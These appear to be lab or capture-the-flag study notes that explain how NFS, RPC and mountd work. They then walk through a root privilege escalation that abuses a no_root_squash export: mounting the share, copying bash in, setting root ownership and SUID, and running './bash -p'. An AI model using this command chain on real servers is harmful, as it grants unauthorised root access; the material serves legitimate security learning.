==Network File System== allows a system to share directories and files with others over a network

It's basically a way for a computer to **share a folder over a network**, so another computer can access that folder as if it were a local folder.

```text
NFS Server
10.10.10.10
    │
    │ shares /home/user/share
    ▼
Network
    │
    ▼
Your Machine
    │
    └── mounts it as /mnt/share
```

### NFS vs SMB
They're very similar in purpose:

|              | NFS                   | SMB                  |
| ------------ | --------------------- | -------------------- |
| Main idea    | Network file sharing  | Network file sharing |
| Common in    | Linux/Unix            | Windows environments |
| Example      | `server:/share`       | `//server/share`     |
| Typical port | **2049**              | **445**              |
| Client       | `mount` / `nfs` tools | `smbclient`          |

### How it works

Imagine the server has:
/home/user/share/
├── notes.txt
├── backup.zip
└── secret.txt

The server says:
> "I'm going to share `/home/user/share` over the network."

Your machine can then **mount** that directory:
```bash
sudo mount 10.10.10.10:/home/user/share /mnt/share
```
Now you can do:
```bash
cd /mnt/share
ls
```
And see:     notes.txt         backup.zip         secret.txt



First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

==NOTE== --> A **daemon** is just a background service/program that waits for requests.
==NOTE== --> The **mount daemon** (`mountd`) is the NFS server component that handles **requests to mount shared directories**.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:
-  The file handle
-  The name of the file to be accessed
-  The user's, user ID
-  The user's group ID  

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.


```text
Client                          NFS Server
  │                                │
  │ "Can I mount /home/share?"     │
  │ ──────────────RPC────────────> │
  │                                │
  │                         mountd checks
  │                         permissions
  │                                │
  │ <─────── "Yes, here's the      │
  │          file handle"          │
  │                                │
```


### What is RPC?

**RPC = Remote Procedure Call**
It's simply a way for one computer to tell another computer:

> "Run this function/service for me."

Instead of directly interacting with `mountd`, the client sends an **RPC request** over the network.

So:
**RPC = the communication mechanism**
**mountd = the service receiving the mount request**

---
### Putting it together

When you run something like:

`sudo mount 10.10.10.10:/home/share /mnt/share`

roughly:

```
Your machine
     │
     │ RPC request
     ▼
NFS mount daemon (mountd)
     │
     │ checks:
     │ "Is this client allowed?"
     ▼
Returns file handle
     │
     ▼
Your machine mounts the directory
```

After that, when you actually access a file, the request goes to **NFSD** (the NFS daemon), rather than `mountd`.

So remember:
> **mountd → handles mounting the shared directory**
> **NFSD → handles accessing the files inside it**

And **RPC is the way the client communicates with these NFS services.**


# NFS enumeration

```bash
/usr/sbin/showmount -e target_ip
```
It asks the NFS server:
> "What directories/shares are you exporting?"


might return:
```bash
Export list for target_ip:
/home/user
/backup
```


Time to mount the share to our local machine!

First, use `mkdir /tmp/mount` to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.


###  Mount the NFS share

Run:

```bash
sudo mount -t nfs target_ip:/the_shared_directory /tmp/mount -nolock
```
Breakdown:
- `mount` → mount a filesystem
- `-t nfs` → it's an NFS filesystem
- `target_ip:/the_shared_directory` → remote NFS share
- `/tmp/mount` → your local mount point
- `-nolock` → don't use NFS file locking



## **What is root_squash?**
By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

## How to gain shell with high priv

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through , as we did in the previous task- and execute this executable to gain a root shell!

**The whole attack**
```text
NFS share
   ↓
Access files on the server
   ↓
Get a low-privilege shell
   ↓
Put a compatible bash executable on NFS
   ↓
NFS is misconfigured with no_root_squash
   ↓
Set SUID on bash
   ↓
Run that bash
   ↓
ROOT
```

### 1. Get the server's Bash

We want a Bash executable that is compatible with the target system.

You can copy it from the target using SSH/SCP:

```bash
scp -i id_rsa username@Target_ip:/bin/bash ~/Downloads/bash
```
This means:

> "Use the SSH key to connect to the server and download `/bin/bash` to my `~/Downloads` directory."

---

### 2. Why Bash?

Because Bash is an executable file.

Normally, when you run:
```bash
bash
```

you get a shell with **your current user's permissions**.
But Linux has a special permission called **SUID**.

### SUID

If an executable has SUID set:
```text
-rwsr-xr-x
   ↑
  SUID
```
the program runs with the **permissions of the file's owner**, rather than the user executing it.

If the owner is `root`:
```text
root root bash
```
then executing that SUID Bash can potentially give you **root privileges**.

---

### 3. Where NFS comes in

The NFS share is mounted on your machine.

Because of the server's bad configuration (`no_root_squash`), root privileges on your machine can be represented as root on the NFS share.

That's the ==critical misconfiguration.==

Normally:
```text
Your root
   ↓
NFS
   ↓
"You're not really root"
```

with **root squashing**.

But with:
```text
no_root_squash
```

the server effectively allows:
```text
Your root
   ↓
NFS
   ↓
Server sees root
```

---

### 4. Set SUID

You put the Bash executable onto the NFS share and, because of the misconfiguration, can set its SUID permission.

Conceptually:

```text
bash
 ↓
owner = root
 ↓
SUID enabled
 ↓
runs as root
```

---

### 5. Execute it

When you execute the SUID Bash, it runs with the owner's privileges:

```text
SUID bash
    ↓
owner = root
    ↓
root shell
```

That's why the pathway says:

> **NFS Access → Low Privilege Shell → Upload Bash → SUID → Execute Bash → ROOT**

### The key vulnerability

The important part isn't simply "NFS exists."

It's:

> **NFS is configured with `no_root_squash`, allowing root privileges from the client to be preserved on the exported filesystem.**

---

## Steps
### Get a compatible Bash executable

```bash
scp -i id_rsa username@10.112.153.177:/bin/bash ~/Downloads/bash
```

Now you have:
```text
~/Downloads/bash
```

---

### Copy Bash into the NFS share

Because `/tmp/mount` represents `/home` on the target, copy Bash into the appropriate home directory:
```bash
cp ~/Downloads/bash /tmp/mount/USERNAME/
```

For example:
```bash
cp ~/Downloads/bash /tmp/mount/missy/
```

Then verify:
```bash
ls -l /tmp/mount/missy/bash
```

---

### Exploit `no_root_squash`

First, check the export configuration:

On the target
```bash
cat /etc/exports
```

You're looking for something similar to:
```text
/home *(rw,no_root_squash)
```

`no_root_squash` is the important part.

On your machine, as root, set the Bash file's owner to root and enable SUID:
```bash
sudo chown root:root /tmp/mount/USERNAME/bash
sudo chmod +s /tmp/mount/USERNAME/bash
```

Check:
```bash
ls -l /tmp/mount/USERNAME/bash
```

You want to see an `s`, something like:
```text
-rwsr-xr-x 1 root root ... bash
```

---

### SSH into the target

```bash
ssh -i id_rsa username@Target_ip
```

Then go to the location where you put Bash:
```bash
cd /home/USERNAME
```

Check:
```bash
ls -l bash
```

It should still show:
```text
-rwsr-xr-x
```

---

### 8. Execute the SUID Bash

Run:
```bash
./bash -p
```

The `-p` tells Bash to **preserve its effective privileges** rather than dropping them.

Check:
```bash
whoami
```

you should get:
```text
root
```

### The important chain

```text
NFS /home
    ↓
Mount it locally
    ↓
Copy Bash into the share
    ↓
no_root_squash
    ↓
chown root + SUID
    ↓
SSH to target
    ↓
./bash -p
    ↓
whoami → root
```

